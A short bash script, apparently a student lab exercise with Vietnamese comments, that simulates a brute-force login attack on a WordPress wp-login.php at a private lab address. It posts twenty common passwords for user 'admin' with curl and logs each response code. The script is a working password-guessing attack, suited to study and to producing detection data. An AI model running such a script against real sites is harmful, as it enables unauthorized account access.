#!/usr/bin/env bash
# ==============================================================================
# simulate_wp_bruteforce.sh - Mô phỏng dò mật khẩu WordPress /wp-login.php
# Phục vụ bài thực nghiệm Đề 19 - DTC245201006 - CNTT K23C
# ==============================================================================

TARGET_URL="http://192.168.21.129/wp-login.php"
TARGET_USER="admin"
ATTEMPTS=20
START_TIME=$(date -u +"%Y-%m-%d %H:%M:%S UTC")
IP_NGUON="Linux Client / Host"

passwords=(
    "123456" "password" "admin123" "welcome" "qwerty"
    "letmein" "monkey" "dragon" "sunshine" "princess"
    "football" "master" "shadow" "superman" "trustno1"
    "killer" "hunter2" "testing" "root123" "wrongpass99"
)

echo -e "\e[36mTarget URL : $TARGET_URL\e[0m"
echo -e "\e[36mTarget User: $TARGET_USER\e[0m"
echo -e "\e[36mAttempts   : $ATTEMPTS requests\e[0m"
echo -e "\e[36mStart Time : $START_TIME\e[0m"
echo -e "\e[36mIP Nguon   : $IP_NGUON\e[0m"
echo -e "\e[36m============================================================\e[0m"

count=1
for pwd in "${passwords[@]}"; do
    now=$(date -u +"%Y-%m-%d %H:%M:%S UTC")
    http_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET_URL" -d "log=$TARGET_USER&pwd=$pwd&wp-submit=Log+In")
    printf "\e[32m[+] Attempt #%-2d | Time: %s | User: %-5s | Pass: %-11s | HTTP: %s\e[0m\n" "$count" "$now" "$TARGET_USER" "$pwd" "$http_code"
    count=$((count + 1))
    sleep 0.4
done

echo -e "\e[36m============================================================\e[0m"
echo -e "\e[32m[+] Simulation finished: sent $ATTEMPTS failed login attempts.\e[0m"
echo -e "\e[36m============================================================\e[0m"
